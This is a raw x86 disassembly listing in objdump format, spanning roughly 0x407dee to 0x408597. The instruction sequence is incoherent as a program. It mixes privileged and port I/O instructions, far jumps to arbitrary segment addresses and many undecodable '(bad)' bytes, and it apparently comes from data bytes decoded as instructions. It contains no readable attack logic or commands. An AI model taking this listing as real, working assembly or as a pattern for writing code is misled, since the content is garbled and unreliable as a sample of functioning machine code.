  407dee:	call   0xb33a1449
  407df3:	inc    ebx
  407df4:	lea    edi,[edx+eiz*8-0x6e]
  407df8:	xchg   edx,eax
  407df9:	cdq    
  407dfa:	add    eax,0x9c195db6
  407dff:	mov    edx,0x1b1bd7ce
  407e04:	pop    ebp
  407e05:	jno    0x407e1f
  407e07:	sbb    al,0xb0
  407e09:	mov    ch,0x37
  407e0b:	push   0x1219f4be
  407e10:	mov    ah,0xcf
  407e12:	js     0x407e81
  407e14:	jg     0x407db6
  407e16:	in     eax,dx
  407e17:	ror    DWORD PTR [edi+ebx*2+0x5478aaa4],1
  407e1e:	mov    ch,0xb2
  407e20:	out    0xe0,al
  407e22:	loopne 0x407db7
  407e24:	rcl    BYTE PTR [esi+esi*8],cl
  407e27:	or     edx,edx
  407e29:	call   0x42d02359
  407e2e:	adc    edx,DWORD PTR [ecx+0x31]
  407e31:	dec    ecx
  407e32:	xchg   ebx,eax
  407e33:	mov    esi,0x799f982
  407e38:	jo     0x407e17
  407e3a:	adc    DWORD PTR [ebx],edi
  407e3c:	hlt    
  407e3d:	jmp    FWORD PTR [esi]
  407e3f:	call   0x452e8f3c
  407e44:	pop    esp
  407e45:	dec    eax
  407e46:	mov    esi,0xb4746486
  407e4b:	cmp    DWORD PTR [edi-0x70],esi
  407e4e:	inc    esi
  407e4f:	mov    ah,0x2e
  407e51:	les    edx,FWORD PTR [ecx]
  407e53:	stc    
  407e54:	jle    0x407e40
  407e56:	ins    DWORD PTR es:[edi],dx
  407e57:	jmp    0x4ee1:0x975dda2f
  407e5e:	xor    esp,DWORD PTR [edx-0x6e]
  407e61:	not    DWORD PTR [ebx]
  407e63:	xchg   ebp,eax
  407e64:	shl    ebx,1
  407e66:	ins    DWORD PTR es:[edi],dx
  407e67:	outs   dx,BYTE PTR ds:[esi]
  407e68:	fwait
  407e69:	adc    al,0x79
  407e6b:	jbe    0x407e02
  407e6d:	mov    dl,0x41
  407e6f:	pushf  
  407e70:	inc    ecx
  407e71:	jbe    0x407dfc
  407e73:	push   ecx
  407e74:	sbb    DWORD PTR [eax-0x2663f049],ebp
  407e7a:	inc    edx
  407e7b:	dec    eax
  407e7c:	lds    ebx,FWORD PTR [edx-0x24b1fbb9]
  407e82:	out    dx,al
  407e83:	sub    al,0x28
  407e85:	fistp  WORD PTR [eax]
  407e87:	push   ss
  407e88:	push   edx
  407e89:	add    ecx,DWORD PTR [esi-0x3f]
  407e8c:	xor    al,0xc
  407e8e:	les    ecx,FWORD PTR [edi-0x5b]
  407e91:	ret    
  407e92:	and    dh,BYTE PTR [ecx-0xf]
  407e95:	inc    ecx
  407e96:	inc    ecx
  407e97:	sti    
  407e98:	sub    esp,DWORD PTR [esi-0x7663193e]
  407e9e:	ins    DWORD PTR es:[edi],dx
  407e9f:	out    0xf9,eax
  407ea1:	inc    esi
  407ea2:	adc    dl,dl
  407ea4:	fs sub eax,0xcca48478
  407eaa:	pop    esi
  407eab:	sub    BYTE PTR [esi-0x3f79c930],0xd
  407eb2:	mov    ds:0xa91cc57c,eax
  407eb7:	test   BYTE PTR [eax+0x4d],0x41
  407ebb:	fsub   st,st(5)
  407ebd:	mov    esi,0xd15b419d
  407ec2:	bound  ebp,QWORD PTR [esi+0x3978f39e]
  407ec8:	adc    cl,BYTE PTR [esi]
  407eca:	xchg   ebp,eax
  407ecb:	pop    ebp
  407ecc:	inc    esp
  407ecd:	nop
  407ece:	sub    al,0x40
  407ed0:	sub    al,0xe8
  407ed2:	or     BYTE PTR ds:0x498a96d2,bh
  407ed8:	dec    ecx
  407ed9:	stc    
  407eda:	aad    0xcc
  407edc:	jne    0x407ef7
  407ede:	xor    bh,BYTE PTR [esi-0x3e]
  407ee1:	ret    0x46b5
  407ee4:	call   0xc6c5:0x2000c43c
  407eeb:	mov    ecx,0xdfc508fb
  407ef0:	rcl    DWORD PTR [edi+0x58],0xee
  407ef4:	add    DWORD PTR [ebx+0x39],0x15
  407ef8:	mov    esi,0x8e9534b
  407efd:	fistp  WORD PTR [esi+0x7ca518c0]
  407f03:	stc    
  407f04:	inc    ebx
  407f05:	mov    ecx,0x842c4813
  407f0a:	icebp  
  407f0b:	dec    esi
  407f0c:	adc    dh,BYTE PTR [eax+0x1b981cf5]
  407f12:	cmp    BYTE PTR [esp+eax*4+0x653c3e2],dl
  407f19:	lods   eax,DWORD PTR ds:[esi]
  407f1a:	retf   0x284
  407f1d:	push   ecx
  407f1e:	jp     0x407eb9
  407f20:	cmp    ecx,esp
  407f22:	push   0xf583d4be
  407f27:	iret   
  407f28:	push   edx
  407f29:	jecxz  0x407f85
  407f2b:	(bad)  
  407f2c:	(bad)  
  407f2d:	ja     0x407f96
  407f2f:	mov    WORD PTR [ebx-0x15b986ce],?
  407f35:	imul   BYTE PTR [ecx]
  407f37:	and    eax,0x843b554a
  407f3c:	sub    DWORD PTR [esi-0x2c],eax
  407f3f:	push   ebx
  407f40:	fs jb  0x407f4f
  407f43:	cli    
  407f44:	mov    bl,BYTE PTR [edx+esi*1]
  407f47:	loope  0x407ee9
  407f49:	sbb    ecx,ebx
  407f4b:	dec    eax
  407f4c:	in     al,0x2c
  407f4e:	push   ebx
  407f4f:	stc    
  407f50:	lods   eax,DWORD PTR ds:[esi]
  407f51:	xchg   cl,bh
  407f53:	or     DWORD PTR [esi+eax*2+0xf],ebp
  407f57:	popf   
  407f58:	mov    bl,0x4b
  407f5a:	push   eax
  407f5b:	and    al,0x0
  407f5d:	cs pop ecx
  407f60:	dec    esi
  407f61:	fdivr  QWORD PTR [esi-0x6c]
  407f64:	retf   
  407f65:	rcr    DWORD PTR [ebp+0x9],1
  407f68:	(bad)  
  407f69:	inc    ebp
  407f6a:	inc    eax
  407f6b:	pop    ebx
  407f6c:	out    0xbc,eax
  407f6e:	cmp    bh,BYTE PTR ds:0x28cfaea4
  407f74:	sar    BYTE PTR [ecx+ecx*8-0x78],cl
  407f78:	call   0x30cef051
  407f7d:	jle    0x407f8d
  407f7f:	xchg   ecx,eax
  407f80:	imul   esp,DWORD PTR [ebx+0x31],0xf8ca325d
  407f87:	xor    cl,BYTE PTR [ebx+0x79]
  407f8a:	xor    eax,0xa9ce7d78
  407f8f:	stos   DWORD PTR es:[edi],eax
  407f90:	add    dl,BYTE PTR ds:0x444900af
  407f96:	aaa    
  407f97:	xchg   esi,eax
  407f98:	into   
  407f99:	xor    BYTE PTR [ebx-0x7556904],0x4a
  407fa0:	jae    0x407f54
  407fa2:	ret    
  407fa3:	dec    esp
  407fa4:	cs jb  0x407f27
  407fa7:	fs das 
  407fa9:	stos   BYTE PTR es:[edi],al
  407faa:	into   
  407fab:	fidiv  DWORD PTR [eax]
  407fad:	adc    ebp,DWORD PTR [ebx-0x6e66b6f0]
  407fb3:	or     bh,dl
  407fb5:	pop    edx
  407fb6:	pop    eax
  407fb7:	push   ebp
  407fb8:	dec    ebx
  407fb9:	mov    al,ds:0x470c3f08
  407fbe:	dec    esp
  407fbf:	jg     0x408032
  407fc1:	lock xchg ebx,eax
  407fc3:	dec    esp
  407fc4:	jp     0x40800d
  407fc6:	push   es
  407fc7:	dec    ecx
  407fc8:	jmp    0x4934:0x767550aa
  407fcf:	lods   al,BYTE PTR ds:[esi]
  407fd0:	jno    0x408049
  407fd2:	lock add al,0x63
  407fd5:	xchg   esp,eax
  407fd6:	pusha  
  407fd7:	lock les ebx,FWORD PTR [edi]
  407fda:	std    
  407fdb:	sbb    DWORD PTR [edx+0x5a],edi
  407fde:	addr16 push esp
  407fe0:	test   esp,edx
  407fe2:	out    dx,eax
  407fe3:	push   0x8102098d
  407fe8:	xchg   esi,eax
  407fe9:	sub    DWORD PTR [edx-0x35],ecx
  407fec:	es sub esi,ecx
  407fef:	jmp    0x407fd2
  407ff1:	and    al,0x74
  407ff3:	lds    edx,FWORD PTR [esp+edx*8-0x64]
  407ff7:	retf   
  407ff8:	sbb    ah,BYTE PTR [eax+esi*2+0x4f]
  407ffc:	in     al,0xcf
  407ffe:	adc    DWORD PTR [ebp-0x57],esi
  408001:	sbb    edi,edx
  408003:	pushw  ss
  408005:	push   ecx
  408006:	xchg   edx,eax
  408007:	pop    es
  408008:	xor    al,BYTE PTR [ecx+0x36]
  40800b:	push   esp
  40800c:	lock dec esi
  40800e:	mov    BYTE PTR [eax-0x5ec8c7af],ch
  408014:	(bad)  
  408015:	mov    ds:0xd2db1ac6,al
  40801a:	bound  edi,QWORD PTR [ebx]
  40801c:	mov    edx,0xc5106d2f
  408021:	mov    bl,0x30
  408023:	mov    ds,WORD PTR [esi+0x5c]
  408026:	xchg   esp,eax
  408027:	push   ds
  408028:	out    dx,eax
  408029:	xchg   ecx,eax
  40802a:	mov    ecx,DWORD PTR [ebx]
  40802c:	push   esi
  40802d:	push   ss
  40802e:	add    dh,BYTE PTR [ebp+eax*4-0x58c3335c]
  408035:	in     eax,dx
  408036:	js     0x407fff
  408038:	test   DWORD PTR [ebx+0x3961cbbd],esp
  40803e:	sti    
  40803f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408040:	fidivr WORD PTR [edx]
  408042:	mov    eax,0x8fcad176
  408047:	sbb    BYTE PTR [ecx-0x47],bl
  40804a:	mov    bh,bl
  40804c:	inc    esi
  40804d:	pop    es
  40804e:	mov    edx,0xcdb877d
  408053:	jns    0x408048
  408055:	jne    0x408034
  408057:	xchg   esi,ebx
  408059:	push   ebx
  40805a:	imul   esp,DWORD PTR [eax],0xffffffd7
  40805d:	lds    esp,FWORD PTR [ebx]
  40805f:	sub    BYTE PTR [ebp-0x1e],dl
  408062:	leave  
  408063:	inc    ebx
  408064:	retf   
  408065:	in     al,dx
  408066:	xchg   esi,eax
  408067:	push   esi
  408068:	inc    ebx
  408069:	adc    DWORD PTR [ecx+0xd],0x6962f51
  408070:	push   esi
  408071:	push   es
  408072:	scas   al,BYTE PTR es:[edi]
  408073:	cmp    al,0x1
  408075:	pop    ebx
  408076:	sbb    BYTE PTR [esi],ah
  408078:	rcr    DWORD PTR ds:0xd9ecf1de,cl
  40807e:	fbld   TBYTE PTR [ecx]
  408080:	dec    esi
  408081:	push   esp
  408082:	adc    BYTE PTR [edi+0x420326d9],cl
  408088:	ficomp DWORD PTR [ebx+0x38]
  40808b:	jecxz  0x4080ea
  40808d:	mov    fs,WORD PTR [ecx]
  40808f:	jne    0x4080fb
  408091:	pop    ebp
  408092:	ins    BYTE PTR es:[edi],dx
  408093:	mov    al,ds:0x2fe3161d
  408098:	imul   ecx,esp,0x2d
  40809b:	sub    DWORD PTR [edi],ebx
  40809d:	mov    BYTE PTR [esi-0x4d],dh
  4080a0:	and    DWORD PTR [eax+0x24],0xead478d4
  4080a7:	cmp    edx,DWORD PTR [ecx+0x62]
  4080aa:	sub    cl,BYTE PTR [ebx]
  4080ac:	outs   dx,DWORD PTR ds:[esi]
  4080ad:	xchg   BYTE PTR [ebx+0x2a5b9dc8],al
  4080b3:	xlat   BYTE PTR ds:[ebx]
  4080b4:	je     0x408062
  4080b6:	sub    eax,0x9905506
  4080bb:	pop    ebx
  4080bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080bd:	mov    edx,0xc9818daa
  4080c2:	mov    edx,0xb3d231f
  4080c7:	popa   
  4080c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c9:	loope  0x408132
  4080cb:	in     eax,dx
  4080cc:	(bad)  [ecx-0x58]
  4080cf:	adc    eax,0xaf0fb031
  4080d4:	push   ss
  4080d5:	or     dh,BYTE PTR [edx]
  4080d7:	xchg   BYTE PTR ds:0xa5173826,dh
  4080dd:	icebp  
  4080de:	or     DWORD PTR [edx+0x36],0x15
  4080e2:	mov    edx,0x9c9adb8
  4080e7:	lock lea edi,[edx-0x15]
  4080eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080ec:	jb     0x40813b
  4080ee:	push   0xef322aab
  4080f3:	(bad)  
  4080f4:	and    edi,esp
  4080f6:	mov    ebx,0xbf601bec
  4080fb:	and    BYTE PTR ds:0x77ac5721,bh
  408101:	mov    eax,ds:0x81fa1145
  408106:	jb     0x4080a3
  408108:	mov    esp,ds
  40810a:	hlt    
  40810b:	add    al,0xc3
  40810d:	jle    0x408133
  40810f:	adc    dl,ch
  408111:	in     al,0xc4
  408113:	push   ebp
  408114:	dec    eax
  408115:	sub    BYTE PTR [eax+0x67985a43],al
  40811b:	mul    BYTE PTR [ebp-0x72]
  40811e:	mov    bh,0xdb
  408120:	out    0xff,al
  408122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408123:	jb     0x408159
  408125:	mov    BYTE PTR [ebp+0x4d],dh
  408128:	push   edi
  408129:	pop    ds
  40812a:	pop    esi
  40812b:	les    ebp,FWORD PTR [edx+0x19]
  40812e:	imul   eax,ebp,0xffffff8c
  408131:	jmp    0x73bd:0x44ac8041
  408138:	dec    sp
  40813a:	lea    ebp,[edx+0x46a98094]
  408140:	inc    ecx
  408141:	fild   WORD PTR [edx]
  408143:	mov    eax,ds:0x6083ef68
  408148:	aam    0x2b
  40814a:	xchg   esi,eax
  40814b:	xchg   ebx,eax
  40814c:	or     dl,bh
  40814e:	push   edi
  40814f:	ficomp WORD PTR [ebp-0x28ffb257]
  408155:	cmp    eax,0x1d0f965c
  40815a:	test   DWORD PTR [ecx],eax
  40815c:	adc    DWORD PTR [ecx-0x73f22d54],ecx
  408162:	jge    0x408164
  408164:	into   
  408165:	call   0x3cbe:0x84eae096
  40816c:	scas   al,BYTE PTR es:[edi]
  40816d:	(bad)  
  40816e:	pop    eax
  40816f:	imul   ebx,DWORD PTR [edi+0x3a95737a],0x934805e1
  408179:	sbb    BYTE PTR [ecx],cl
  40817b:	pop    ecx
  40817c:	or     DWORD PTR [ebp+0x74],edi
  40817f:	jle    0x408132
  408181:	lea    edi,[esi+0x4ca2cdf2]
  408187:	mov    bl,BYTE PTR [edx]
  408189:	push   esi
  40818a:	pop    ss
  40818b:	mov    esp,0xf6760a4d
  408190:	cwde   
  408191:	pop    esi
  408192:	mov    bh,0x56
  408194:	iret   
  408195:	gs in  al,dx
  408197:	ins    BYTE PTR es:[edi],dx
  408198:	pop    ebp
  408199:	pop    eax
  40819a:	adc    al,al
  40819c:	push   ebp
  40819d:	adc    al,0xa7
  40819f:	aaa    
  4081a0:	jp     0x40814a
  4081a2:	dec    edi
  4081a3:	popf   
  4081a4:	repnz jecxz 0x40816f
  4081a7:	test   BYTE PTR [ebx-0x4e0e0a95],bl
  4081ad:	cmp    BYTE PTR [esi-0x15],ah
  4081b0:	std    
  4081b1:	fs mov ebp,0xca980b6c
  4081b7:	inc    ebx
  4081b8:	retf   0x7ded
  4081bb:	jl     0x4081f9
  4081bd:	cmp    eax,0xa1653021
  4081c2:	xor    BYTE PTR [edi+eiz*2+0x5fed9661],bl
  4081c9:	adc    eax,0xf7bd9437
  4081ce:	xchg   ebp,eax
  4081cf:	lods   eax,DWORD PTR ds:[esi]
  4081d0:	(bad)  
  4081d1:	pop    esp
  4081d2:	push   es
  4081d3:	jnp    0x40818c
  4081d5:	and    BYTE PTR [esi],al
  4081d7:	loop   0x4081c2
  4081d9:	and    DWORD PTR [eax+0x2],ecx
  4081dc:	mov    esp,0x4ca38260
  4081e1:	jne    0x408233
  4081e3:	xlat   BYTE PTR ds:[ebx]
  4081e4:	mov    DWORD PTR [ecx+0x41],ecx
  4081e7:	pop    ebx
  4081e8:	xchg   esp,eax
  4081e9:	sbb    DWORD PTR [ecx-0xf],esi
  4081ec:	and    ebx,DWORD PTR [eax+eax*8-0x1]
  4081f0:	push   edi
  4081f1:	bnd ret 0xf2d1
  4081f5:	pop    ebx
  4081f6:	jae    0x408229
  4081f8:	dec    ebx
  4081f9:	and    al,0x8c
  4081fb:	push   0xffffffca
  4081fd:	lds    ebx,FWORD PTR [edx+0x53a8a5ea]
  408203:	(bad)  
  408204:	stc    
  408205:	pop    esi
  408206:	xor    dh,BYTE PTR [ecx+0xd3221f7]
  40820c:	jge    0x40819a
  40820e:	in     al,0x17
  408210:	pop    esp
  408211:	dec    ecx
  408212:	cmp    al,dl
  408214:	jge    0x40827e
  408216:	dec    eax
  408217:	int    0x81
  408219:	inc    ecx
  40821a:	push   es
  40821b:	jge    0x408230
  40821d:	lock je 0x40827a
  408220:	ret    
  408221:	loopne 0x40820b
  408223:	dec    ecx
  408224:	sub    al,0x9e
  408226:	push   edi
  408227:	fild   WORD PTR [ecx]
  408229:	arpl   WORD PTR ds:0x3dd67dd7,bp
  40822f:	xlat   BYTE PTR ds:[ebx]
  408230:	xchg   ebp,eax
  408231:	mov    ebx,DWORD PTR [esi+eiz*8]
  408234:	mov    bh,0x88
  408236:	jno    0x4082aa
  408238:	mov    ebp,0xfd785af6
  40823d:	xchg   DWORD PTR [edx-0x2f],edi
  408240:	in     eax,dx
  408241:	rol    BYTE PTR [edi-0x1d],0x57
  408245:	mov    esp,0xecae5d6e
  40824a:	mov    ebp,0xb9c4f3fa
  40824f:	pop    ds
  408250:	jo     0x408266
  408252:	jnp    0x408202
  408254:	int    0x61
  408256:	pop    es
  408257:	push   ss
  408258:	test   cl,bh
  40825a:	aad    0xc5
  40825c:	pop    ebx
  40825d:	xchg   ebx,eax
  40825e:	pop    ss
  40825f:	push   es
  408260:	loope  0x40823e
  408262:	mov    eax,0xf1b47001
  408267:	adc    DWORD PTR [edx],edx
  408269:	mov    ebx,0xebb3c7ee
  40826e:	out    dx,al
  40826f:	je     0x408210
  408271:	scas   al,BYTE PTR es:[edi]
  408272:	jp     0x408217
  408274:	xchg   esp,eax
  408275:	mov    al,ds:0x3e96211e
  40827a:	xchg   edi,eax
  40827b:	sub    ebx,edx
  40827d:	jnp    0x408270
  40827f:	rol    BYTE PTR ds:0x84b2ea00,0xf4
  408286:	repz div DWORD PTR [eax+ecx*2+0x18]
  40828b:	out    dx,eax
  40828c:	adc    DWORD PTR [eax],edx
  40828e:	aad    0xd1
  408290:	mov    BYTE PTR [ecx],ah
  408292:	mov    ebx,0x29642001
  408297:	les    edx,FWORD PTR [ebx]
  408299:	mov    esp,0x1a12f642
  40829e:	xchg   DWORD PTR [esp+eax*2-0x5e],esp
  4082a2:	xchg   edx,eax
  4082a3:	(bad)  
  4082a4:	mov    esp,0xf5333dc7
  4082a9:	xchg   edx,eax
  4082aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ab:	(bad)  
  4082ac:	cs mov edi,0x9daa849e
  4082b2:	inc    edi
  4082b3:	addr16 sub eax,0x27136beb
  4082b9:	push   0x7919e37d
  4082be:	sbb    ah,bh
  4082c0:	push   ecx
  4082c1:	sahf   
  4082c2:	jge    0x408289
  4082c4:	mov    bh,0x7a
  4082c6:	cmp    al,BYTE PTR [edx+0x7d]
  4082c9:	mov    eax,0xb03a4c49
  4082ce:	out    0x94,al
  4082d0:	in     eax,0x5e
  4082d2:	daa    
  4082d3:	or     BYTE PTR [edx],ch
  4082d5:	retf   0x3878
  4082d8:	mov    dl,0x40
  4082da:	mov    dl,0x3e
  4082dc:	or     BYTE PTR [esi-0x3a],ah
  4082df:	or     BYTE PTR [ebx],cl
  4082e1:	cmp    eax,0xc3700a7a
  4082e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e7:	mov    al,ds:0x76281d25
  4082ec:	inc    eax
  4082ed:	sbb    al,0x14
  4082ef:	pop    edx
  4082f0:	sub    DWORD PTR [edx],ecx
  4082f2:	cdq    
  4082f3:	aam    0xa7
  4082f5:	dec    esp
  4082f6:	fnstcw WORD PTR [edx-0x7a0aa7ad]
  4082fc:	cmp    al,0xe2
  4082fe:	inc    edx
  4082ff:	jg     0x4082df
  408301:	adc    ebx,DWORD PTR [edx-0x77]
  408304:	mov    esi,0x25d8b960
  408309:	jp     0x4082b2
  40830b:	pop    ebx
  40830c:	mov    ebx,0xd573c235
  408311:	pop    ss
  408312:	std    
  408313:	loop   0x408327
  408315:	and    bl,BYTE PTR [eax-0x46]
  408318:	xor    DWORD PTR [edi],edx
  40831a:	das    
  40831b:	add    BYTE PTR [ebx+0x63],0x74
  40831f:	jg     0x4082de
  408321:	ret    0x1592
  408324:	ror    DWORD PTR [eax+ebp*1],1
  408327:	hlt    
  408328:	sysret 
  40832a:	add    al,al
  40832c:	mov    ecx,0x7917094f
  408331:	push   0xffffff97
  408333:	nop
  408334:	jnp    0x4082be
  408336:	loop   0x408337
  408338:	cmc    
  408339:	cmp    BYTE PTR [ebx-0x4f],0x11
  40833d:	xchg   BYTE PTR [ecx-0x1],al
  408340:	jmp    0xbfc7:0x5df2d944
  408347:	jb     0x4083c3
  408349:	dec    ebx
  40834a:	data16 stc 
  40834c:	sub    al,BYTE PTR ds:0x3a742d8e
  408352:	jge    0x4083d0
  408354:	dec    ecx
  408355:	(bad)
  408358:	sar    DWORD PTR [ebp-0x2b],cl
  40835b:	sti    
  40835c:	jecxz  0x4083ba
  40835e:	aam    0xb3
  408360:	in     eax,0x74
  408362:	mov    al,0xa0
  408364:	lods   eax,DWORD PTR ds:[esi]
  408365:	inc    edi
  408366:	push   eax
  408367:	fild   DWORD PTR [esi]
  408369:	cli    
  40836a:	fiadd  WORD PTR [edx]
  40836c:	outs   dx,BYTE PTR ds:[esi]
  40836d:	cmp    DWORD PTR [esi],edx
  40836f:	pop    ss
  408370:	or     ecx,edi
  408372:	movups xmm4,xmm0
  408375:	mov    ?,edx
  408377:	mov    ebp,0xedc1bc31
  40837c:	push   ebx
  40837d:	xchg   ebp,eax
  40837e:	aad    0xcc
  408380:	and    eax,0x12813485
  408385:	repz ror DWORD PTR [edx+0x130f1744],1
  40838c:	adc    dh,BYTE PTR [esi-0x4e]
  40838f:	push   ds
  408390:	mov    al,dh
  408392:	push   ds
  408393:	call   0x2b5e9f43
  408398:	leave  
  408399:	jp     0x4083fb
  40839b:	sub    edx,ecx
  40839d:	hlt    
  40839e:	adc    dh,BYTE PTR [ebp-0x6f2bde2b]
  4083a4:	mov    edx,0x909b0ebb
  4083a9:	(bad)  
  4083aa:	xor    al,0x2e
  4083ac:	or     ecx,esp
  4083ae:	jecxz  0x4083ef
  4083b0:	lods   al,BYTE PTR ds:[esi]
  4083b1:	xchg   esp,eax
  4083b2:	xchg   edx,eax
  4083b3:	push   ebp
  4083b4:	sti    
  4083b5:	rol    dh,0xf8
  4083b8:	ret    0x78cc
  4083bb:	xor    eax,0x8e2258b6
  4083c0:	outs   dx,BYTE PTR ds:[esi]
  4083c1:	clc    
  4083c2:	mul    BYTE PTR [esi+0x5b]
  4083c5:	mov    ebx,0x31a7d4c2
  4083ca:	pusha  
  4083cb:	aas    
  4083cc:	aaa    
  4083cd:	lahf   
  4083ce:	in     al,dx
  4083cf:	jg     0x4083db
  4083d1:	jb     0x40836a
  4083d3:	push   edx
  4083d4:	mov    ecx,0x5561eb62
  4083d9:	jmp    0x4083ce
  4083db:	add    bl,BYTE PTR [ebx]
  4083dd:	loop   0x4083df
  4083df:	mov    DWORD PTR [edi-0x4],ecx
  4083e2:	xchg   edi,eax
  4083e3:	fnstsw WORD PTR [ebp+0x5d]
  4083e6:	pop    ebx
  4083e7:	sub    ebx,DWORD PTR [esi+0x100a11ba]
  4083ed:	add    DWORD PTR [ecx-0x3ebb539a],ecx
  4083f3:	stos   DWORD PTR es:[edi],eax
  4083f4:	sbb    ebx,DWORD PTR [ebp+0x46526a28]
  4083fa:	pop    ebp
  4083fb:	dec    ebp
  4083fc:	jbe    0x4083d7
  4083fe:	or     DWORD PTR [esi],0x42fe97cb
  408404:	fadd   QWORD PTR [esi]
  408406:	sahf   
  408407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408408:	popa   
  408409:	ds enter 0x3a01,0x70
  40840e:	cmp    al,0xb6
  408410:	add    BYTE PTR [esi],bh
  408412:	test   ch,0x95
  408415:	jp     0x408440
  408417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408418:	ret    0x7fd3
  40841b:	cmp    eax,0x96ced071
  408420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408421:	and    al,0xd7
  408423:	inc    eax
  408424:	retf   0xce7b
  408427:	sub    cl,BYTE PTR ss:[ebp-0x180f11f9]
  40842e:	les    ecx,FWORD PTR [ebx-0x22]
  408431:	cmp    bh,BYTE PTR [edi-0x6a]
  408434:	adc    edx,0xffffff81
  408437:	inc    edx
  408438:	gs xor al,0xc7
  40843b:	cmp    eax,0x2b9f0350
  408440:	icebp  
  408441:	cmp    al,0x2c
  408443:	stos   BYTE PTR es:[edi],al
  408444:	cmp    al,0x9c
  408446:	cmc    
  408447:	je     0x4083df
  408449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40844a:	aam    0xd7
  40844c:	inc    esp
  40844d:	scas   al,BYTE PTR es:[edi]
  40844e:	inc    ecx
  40844f:	inc    edi
  408450:	xchg   esi,eax
  408451:	pop    edx
  408452:	and    cl,bh
  408454:	xlat   BYTE PTR ds:[ebx]
  408455:	pop    ebx
  408456:	inc    edx
  408457:	and    al,0x1b
  408459:	out    0x88,eax
  40845b:	mov    ecx,0x7d62b566
  408460:	mov    esi,ecx
  408462:	sub    ecx,DWORD PTR [ecx-0x42432ea8]
  408468:	mov    ebp,0x4be41abc
  40846d:	xchg   ebp,eax
  40846e:	pop    ss
  40846f:	test   eax,0x3f27daa3
  408474:	push   esi
  408475:	jge    0x4084bf
  408477:	push   esi
  408478:	sar    BYTE PTR [edx],cl
  40847a:	jmp    0xa4d4:0xe2fe8804
  408481:	cmc    
  408482:	jns    0x40842f
  408484:	and    DWORD PTR [eax-0x2e3131c9],0x60
  40848b:	jl     0x4084b5
  40848d:	push   edi
  40848e:	aas    
  40848f:	inc    ebp
  408490:	push   ebx
  408491:	shl    BYTE PTR [esi+0x49],0x97
  408495:	dec    ebx
  408496:	les    edi,FWORD PTR [edi]
  408498:	push   edi
  408499:	sbb    DWORD PTR [edx],ebp
  40849b:	push   eax
  40849d:	call   DWORD PTR [ecx-0x40d31103]
  4084a3:	into   
  4084a4:	add    ecx,DWORD PTR [ebx]
  4084a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084a7:	and    eax,0xdb1ca3cb
  4084ac:	dec    edi
  4084ad:	pop    es
  4084ae:	imul   ebx
  4084b0:	dec    ecx
  4084b1:	inc    esp
  4084b2:	jo     0x408475
  4084b4:	jne    0x4084af
  4084b6:	(bad)  
  4084b7:	arpl   di,sp
  4084b9:	inc    ebx
  4084ba:	add    eax,0xe7db70af
  4084bf:	lea    ecx,[eax+eax*1-0x59]
  4084c3:	dec    ebx
  4084c4:	std    
  4084c5:	mov    ch,0xaa
  4084c7:	sbb    al,0xbb
  4084c9:	cmc    
  4084ca:	(bad)  
  4084cb:	jbe    0x408499
  4084cd:	aas    
  4084ce:	rcr    BYTE PTR [edi-0x13],1
  4084d1:	mov    ds:0x788a3872,al
  4084d6:	mov    edx,0x57909182
  4084db:	sbb    BYTE PTR [ebx+0x34b04c5b],cl
  4084e1:	outs   dx,BYTE PTR ds:[esi]
  4084e2:	and    al,0xbd
  4084e4:	popa   
  4084e5:	pusha  
  4084e6:	gs (bad) 
  4084e8:	fistp  WORD PTR [esi]
  4084ea:	cmp    eax,0x29bc36e4
  4084ef:	lahf   
  4084f0:	cs adc al,0xed
  4084f3:	push   edi
  4084f4:	mov    cl,0xbd
  4084f7:	(bad)  
  4084f9:	pop    ebp
  4084fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084fb:	jnp    0x40853e
  4084fd:	sub    DWORD PTR [ebp+0x17],eax
  408500:	cmp    eax,0x9609ddd1
  408505:	and    al,0x2e
  408507:	pop    esi
  408508:	add    bl,dl
  40850a:	push   ebx
  40850b:	(bad)  
  40850c:	loope  0x40852e
  40850e:	scas   eax,DWORD PTR es:[edi]
  40850f:	jns    0x408586
  408511:	inc    ecx
  408512:	mov    DWORD PTR [edx],esp
  408514:	and    BYTE PTR [ebp-0x6c5171d5],ah
  40851a:	mov    ds,WORD PTR [ebx+ebp*4+0x4e396d53]
  408521:	fadd   DWORD PTR [ebx-0x4d518824]
  408527:	ins    BYTE PTR es:[edi],dx
  408528:	(bad)  
  408529:	dec    edi
  40852a:	and    BYTE PTR [edx*2+0xfb78f90],bl
  408531:	xchg   ecx,eax
  408532:	hlt    
  408533:	in     al,dx
  408534:	or     eax,0x55f91d71
  408539:	(bad)  
  40853a:	mov    ds:0x68ccdfe7,al
  40853f:	into   
  408540:	cmp    eax,0x5d28be9e
  408545:	repz mov ah,BYTE PTR [esi]
  408548:	add    eax,0xd0a0658f
  40854d:	xchg   esp,eax
  40854e:	sar    cl,1
  408550:	retf   
  408551:	pusha  
  408552:	xor    ecx,edx
  408554:	push   ebp
  408555:	cmp    bh,BYTE PTR [ebp+0x163d847b]
  40855b:	into   
  40855c:	daa    
  40855d:	in     eax,dx
  40855e:	xor    dh,BYTE PTR [ecx-0x44]
  408561:	inc    BYTE PTR [edi]
  408563:	je     0x4085b3
  408565:	xchg   edi,eax
  408566:	daa    
  408567:	mov    dh,0x74
  408569:	push   cs
  40856a:	mov    esp,0xcdcf7c4c
  40856f:	sub    eax,0x786c43f5
  408574:	out    dx,eax
  408575:	and    al,0x28
  408577:	mov    ah,0xdd
  408579:	add    al,0xd5
  40857b:	imul   edi,DWORD PTR [ebx+ecx*4-0x64aac339],0xffffff99
  408583:	call   FWORD PTR [edx+0x31]
  408586:	or     ebx,edx
  408588:	mov    dl,0x1b
  40858a:	scas   al,BYTE PTR es:[edi]
  40858b:	mov    ecx,0xad9fb970
  408590:	xor    eax,0xe293f2ca
  408595:	clc    
  408596:	inc    esi
  408597:	in     al,dx
